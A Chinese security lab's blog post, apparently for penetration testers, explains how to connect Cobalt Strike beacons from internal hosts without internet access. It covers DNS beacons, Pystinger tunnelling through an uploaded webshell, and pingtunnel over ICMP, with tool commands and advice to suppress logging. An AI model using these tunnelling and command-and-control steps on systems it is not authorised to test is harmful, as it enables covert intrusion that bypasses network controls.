<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2QdNPdGAIcjx4MMULZya1g)

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrynhicSC9oWDibJEW3BUhEIWManZGCkeyNxMv9pQzctc5ZF2mlFAnYQegWvg559w1Gw4nJndYHQaJUg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

戟星安全实验室

  

    忆享科技旗下高端的网络安全攻防服务团队.安服内容包括渗透测试、代码审计、应急响应、漏洞研究、威胁情报、安全运维、攻防演练等

  

本文约1400字，阅读约需4分钟。

  

###   

![图片](https://mmbiz.qpic.cn/mmbiz_png/ib745vqibLBGIeAicnHiag9GCzTYjeicic5IWPqfyjLajDuwtJdNCAnCgcolqY8ROaE5CsEXR5zbjCU9aVl3WfkZpnDw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

0x00 前言

  

在平时测试的时候碰到目标主机不出网的情况，这时又想上线cs方便后续操作，通过网上查阅资料和学习，就如何上线不出网主机的方式进行了总结。

###   

![图片](https://mmbiz.qpic.cn/mmbiz_png/ib745vqibLBGIeAicnHiag9GCzTYjeicic5IWPqfyjLajDuwtJdNCAnCgcolqY8ROaE5CsEXR5zbjCU9aVl3WfkZpnDw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

0x01 通过DNS上线

  

在拿到网站后发现只有DNS能出网，这时候就可以通过DNS上线

第一步需要一个域名，然后配置域名的ns记录

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrzsKNEsGWHFVfibhphB5oibjWdAyenQicORib3cFYuibT5Wia3bT005LiaCibglWTLPqkn0L8Ciabl1EDTBFVA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

在cs的监听器中新增一个DNS监听器，注意选择Beacon DNS

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrzsKNEsGWHFVfibhphB5oibjWic4pPCkyGnuPflDFwlj6hd5GWIe1TKB8ticpORMiaAD9ibPlAYu0FEaM2Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

如果出现下面这种错误表示53端口被systemd-resolved占用了

关闭方法：

```
systemctl stop system-resolved
```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrzsKNEsGWHFVfibhphB5oibjW4iafXpXaKv6GxwcQiaicWmIXfnHtUWR5A7nzpNlX4EOPZpK8VEicGv8L3g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

生成一个马运行后上线

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrzsKNEsGWHFVfibhphB5oibjWsn8nhRXvsTIVVc1F5zmFpnK11gzUtVThVF3YSOAezjoo22KMsCibDibQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

在上线之后，图标是一个黑框，与http和tcp的不一样它没有60秒的睡眠，有时甚至以为beacon死掉了，其实如果要和beacon交互还需要输入checkin命令，这时候图标就会变回正常上线时的图标，但速度是真的慢，所以需要修改一下传输方式，输入mode dns-txt命令后，速度就会比刚才快了,但进行上传下载时还是慢。

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrzsKNEsGWHFVfibhphB5oibjW7ojZhI1mC9FmLzN4F0fbFuS9VicN0TjbKc6Pn4fh8vDZWoQTINqAQfQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

稳定性取决于网络情况，就算修改为dns-txt，相比于默认方式的快了许多，但进行上传和下载的时候还是很难受。

###   

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

0x02 通过Pystinger上线cs

  

pystinger可通过webshell实现sock4代理、端口映射，在无法出网的机器上上线cs  

下载地址：

```
https://github.com/FunnyWolf/pystinger
```

1.将webshell上传到服务器，能正常访问

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

将文件上传到目标服务器后启动。

```
`linux：./stinger_server0.0.0.0``windows：startstinger_server.exe 0.0.0.0`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在自己的cs服务器上运行

```
./stinger_client-w http://目标web地址/proxy.php -l 127.0.0.1 -p 60000
```

意思是将目标流量转发到自己服务器的60000端口

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

监听器配置

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

生成马，目标服务器运行后上线

###   

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

0x03 通过icmp上线cs

  

**pingtunnel**

下载地址：

```
https://github.com/esrrhs/pingtunnel
```

该工具是将流量伪装成icmp流量

1.  先在自己的服务器上开启服务端
    

```
./pingtunnel -type server
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

2.客户端命令

```
pingtunnel.exe-type client -l 127.0.0.1:8888 -s 192.168.1.71-t 192.168.1.71:9999 -tcp 1-noprint 1 -nolog 1
```

这里建议带上-noprint 1 -nolog 1 防止产生大量日志和数据

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这时候客户端已经成功链接上服务端

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

3.创建两个监听器

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

用127.0.0.1的监听器生成木马上传到服务器运行后成功上线

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

0x03 总结

  

在利用pystinger反向代理套反向shell失败的情况下，改用正向代理中套正向shell来上线不出网主机。

  

  

 声明

    由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，戟星安全实验室及文章作者不为此承担任何责任。

    戟星安全实验室拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经破军安全实验室允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

戟星安全实验室

# 长按二维码 关注我们 #